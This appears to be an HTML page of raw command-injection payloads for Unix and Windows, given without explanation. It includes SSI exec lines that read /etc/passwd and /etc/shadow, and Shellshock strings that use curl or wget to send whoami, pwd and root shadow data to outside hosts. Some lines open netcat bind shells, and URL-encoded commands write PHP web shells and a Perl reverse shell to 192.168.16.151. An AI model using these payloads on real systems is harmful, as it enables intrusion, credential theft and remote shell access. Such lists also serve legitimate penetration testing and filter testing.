<h3>Unix</h3>
<pre>
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
/index.html|id|
;id;
;id
;netstat -a;
;system('cat%20/etc/passwd')
;id;
|id
|/usr/bin/id
|id|
|/usr/bin/id|
||/usr/bin/id|
|id;
||/usr/bin/id;
;id|
;|/usr/bin/id|
\n/bin/ls -al\n
\n/usr/bin/id\n
\nid\n
\n/usr/bin/id;
\nid;
\n/usr/bin/id|
\nid|
;/usr/bin/id\n
;id\n
|usr/bin/id\n
|nid\n
`id`
`/usr/bin/id`
a);id
a;id
a);id;
a;id;
a);id|
a;id|
a)|id
a|id
a)|id;
a|id
|/bin/ls -al
a);/usr/bin/id
a;/usr/bin/id
a);/usr/bin/id;
a;/usr/bin/id;
a);/usr/bin/id|
a;/usr/bin/id|
a)|/usr/bin/id
a|/usr/bin/id
a)|/usr/bin/id;
a|/usr/bin/id
;system('cat%20/etc/passwd')
;system('id')
;system('/usr/bin/id')
%0Acat%20/etc/passwd
%0A/usr/bin/id
%0Aid
%0A/usr/bin/id%0A
%0Aid%0A
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
%0a ping -i 30 127.0.0.1 %0a
`ping 127.0.0.1`
| id
& id
; id
%0a id %0a
`id`
$;/usr/bin/id
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
cat /etc/hosts
$(`cat /etc/passwd`)
cat /etc/passwd
%0Acat%20/etc/passwd
&#123;&#123; get_user_file(&quot;/etc/passwd&quot;) &#125;&#125;
&lt; !--#exec cmd="/bin/cat /etc/passwd"--&gt;
&lt; !--#exec cmd="/bin/cat /etc/shadow"--&gt;
&lt; !--#exec cmd="/usr/bin/id;"--&gt;
system('cat /etc/passwd');
&lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;
</pre>

<h3>Windows</h3>
<pre>
` %60
|| %7C%7C
| %7C
; %3B
' %27
' "%27%22%22
" %22
" ' %22%27%22
"' %22%27%22
& %26
&& %26%26
%0a %250a
%0a%0d %250a%250d
%0Aid %250Aid
%0a id %0a %250a%20id%250a
%0Aid%0A %250Aid%250A
%0a ping -i 30 127.0.0.1 %0a %250a%20ping%20-i%2030%20127.0.0.1%20%250a
%0A/usr/bin/id %250A/usr/bin/id
%0A/usr/bin/id%0A %250A/usr/bin/id%250A
%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 %2520-%6e%2021%20127.0.0.1%7C%7C%60ping%20-%63%2021%20127.0.0.1%60%20%23'%20%7Cping%20-%6e%2021%20127.0.0.1%7C%7C%60ping%20-%63%2021%20127.0.0.1%60%20%23%5c%22%20%7Cping%20-%6e%2021%20127.0.0.1
%20{${phpinfo()}} %2520%7B%24%7Bphpinfo%28%29%7D%7D
%20{${sleep(20)}} %2520%7B%24%7Bsleep%2820%29%7D%7D
%20{${sleep(3)}} %2520%7B%24%7Bsleep%283%29%7D%7D
a|id| a%7Cid%7C
a;id| a%3Bid%7C
a;id; a%3Bid%3B
a;id\n a%3Bid%250a
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12 %28%29%20%7B%20%3A%3B%7D%3B%20curl%20http%3A//135.23.158.130/.testing/shellshock.txt%3Fvuln%3D12
| curl http://crowdshield.com/.testing/rce.txt %7C%20curl%20http%3A//crowdshield.com/.testing/rce.txt
& curl http://crowdshield.com/.testing/rce.txt %26%20curl%20http%3A//crowdshield.com/.testing/rce.txt
; curl https://crowdshield.com/.testing/rce_vuln.txt %3B%20curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt
&& curl https://crowdshield.com/.testing/rce_vuln.txt %26%26%20curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt
curl https://crowdshield.com/.testing/rce_vuln.txt curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt
 curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt %20curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%20%7C%7C%60curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%60%20%23'%20%7Ccurl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%7C%7C%60curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%60%20%23%5c%22%20%7Ccurl%20https%3A//crowdshield.com/.testing/rce_vuln.txt
curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%20%7C%7C%60curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%60%20%23'%20%7Ccurl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%7C%7C%60curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%60%20%23%5c%22%20%7Ccurl%20https%3A//crowdshield.com/.testing/rce_vuln.txt
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`) %24%28%60curl%20https%3A//crowdshield.com/.testing/rce_vuln.txt%3Freq%3D22jjffjbn%60%29
dir dir
| dir %7C%20dir
; dir %3B%20dir
$(`dir`) %24%28%60dir%60%29
& dir %26%20dir
&&dir %26%26dir
&& dir %26%26%20dir
| dir C:\ %7C%20dir%20C%3A%5C
; dir C:\ %3B%20dir%20C%3A%5C
& dir C:\ %26%20dir%20C%3A%5C
&& dir C:\ %26%26%20dir%20C%3A%5C
dir C:\ dir%20C%3A%5C
| dir C:\Documents and Settings\* %7C%20dir%20C%3A%5CDocuments%20and%20Settings%5C%2A
; dir C:\Documents and Settings\* %3B%20dir%20C%3A%5CDocuments%20and%20Settings%5C%2A
& dir C:\Documents and Settings\* %26%20dir%20C%3A%5CDocuments%20and%20Settings%5C%2A
&& dir C:\Documents and Settings\* %26%26%20dir%20C%3A%5CDocuments%20and%20Settings%5C%2A
dir C:\Documents and Settings\* dir%20C%3A%5CDocuments%20and%20Settings%5C%2A
| dir C:\Users %7C%20dir%20C%3A%5CUsers
; dir C:\Users %3B%20dir%20C%3A%5CUsers
& dir C:\Users %26%20dir%20C%3A%5CUsers
&& dir C:\Users %26%26%20dir%20C%3A%5CUsers
dir C:\Users dir%20C%3A%5CUsers

;echo%20%27%3Cscript%3Ealert%281%29%3C/script%3E%27
echo%20%27%3Cimg%20src%3Dhttps%3A//crowdshield.com/.testing/xss.js%20onload%3Dprompt%282%29%20onerror%3Dalert%283%29%3E%3C/img%3E%27//%20XXXXXXXXXXX
| echo%20%22%3C%3Fphp%20include%28%24_GET%5B%27page%27%5D%29%7C%20%22%20%3E%20rfi.php
; echo%20%22%3C%3Fphp%20include%28%24_GET%5B%27page%27%5D%29%3B%20%3F%3E%22%20%3E%20rfi.php
& echo%20%22%3C%3Fphp%20include%28%24_GET%5B%27page%27%5D%29%3B%20%3F%3E%22%20%3E%20rfi.php
&& echo%20%22%3C%3Fphp%20include%28%24_GET%5B%27page%27%5D%29%3B%20%3F%3E%22%20%3E%20rfi.php
echo%20%22%3C%3Fphp%20include%28%24_GET%5B%27page%27%5D%29%3B%20%3F%3E%22%20%3E%20rfi.php
| echo%20%22%3C%3Fphp%20system%28%27dir%20%24_GET%5B%27dir%27%5D%27%29%7C%20%22%20%3E%20dir.php
; echo%20%22%3C%3Fphp%20system%28%27dir%20%24_GET%5B%27dir%27%5D%27%29%3B%20%3F%3E%22%20%3E%20dir.php
& echo%20%22%3C%3Fphp%20system%28%27dir%20%24_GET%5B%27dir%27%5D%27%29%3B%20%3F%3E%22%20%3E%20dir.php
&& echo%20%22%3C%3Fphp%20system%28%27dir%20%24_GET%5B%27dir%27%5D%27%29%3B%20%3F%3E%22%20%3E%20dir.php
echo%20%22%3C%3Fphp%20system%28%27dir%20%24_GET%5B%27dir%27%5D%27%29%3B%20%3F%3E%22%20%3E%20dir.php
| echo%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%7C%20%22%20%3E%20cmd.php
; echo%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20%3E%20cmd.php
& echo%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20%3E%20cmd.php
&& echo%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20%3E%20cmd.php
echo%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20%3E%20cmd.php
;echo%20%27%3Cscript%3Ealert%281%29%3C/script%3E%27
echo%20%27%3Cscript%3Ealert%281%29%3C/script%3E%27//%20XXXXXXXXXXX
echo%20%27%3Cscript%20src%3Dhttps%3A//crowdshield.com/.testing/xss.js%3E%3C/script%3E%27//%20XXXXXXXXXXX
| echo%20%22use%20Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%3BS%22%29%3Bopen%28STDOUT%2C%22%3E%3BS%22%29%3Bopen%28STDERR%2C%22%3E%3BS%22%29%3Bexec%28%22/bin/sh%20-i%22%29%3B%7D%3B%22%20%3E%20rev.pl
; echo%20%22use%20Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%3BS%22%29%3Bopen%28STDOUT%2C%22%3E%3BS%22%29%3Bopen%28STDERR%2C%22%3E%3BS%22%29%3Bexec%28%22/bin/sh%20-i%22%29%3B%7D%3B%22%20%3E%20rev.pl
& echo%20%22use%20Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%3BS%22%29%3Bopen%28STDOUT%2C%22%3E%3BS%22%29%3Bopen%28STDERR%2C%22%3E%3BS%22%29%3Bexec%28%22/bin/sh%20-i%22%29%3B%7D%3B%22%20%3E%20rev.pl
&& echo%20%22use%20Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%3BS%22%29%3Bopen%28STDOUT%2C%22%3E%3BS%22%29%3Bopen%28STDERR%2C%22%3E%3BS%22%29%3Bexec%28%22/bin/sh%20-i%22%29%3B%7D%3B%22%20%3E%20rev.pl
echo%20%22use%20Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%3BS%22%29%3Bopen%28STDOUT%2C%22%3E%3BS%22%29%3Bopen%28STDERR%2C%22%3E%3BS%22%29%3Bexec%28%22/bin/sh%20-i%22%29%3B%7D%3B%22%20%3E%20rev.pl
()%20%7B%20%3A%3B%7D%3B%20echo%20vulnerable%2010


</pre>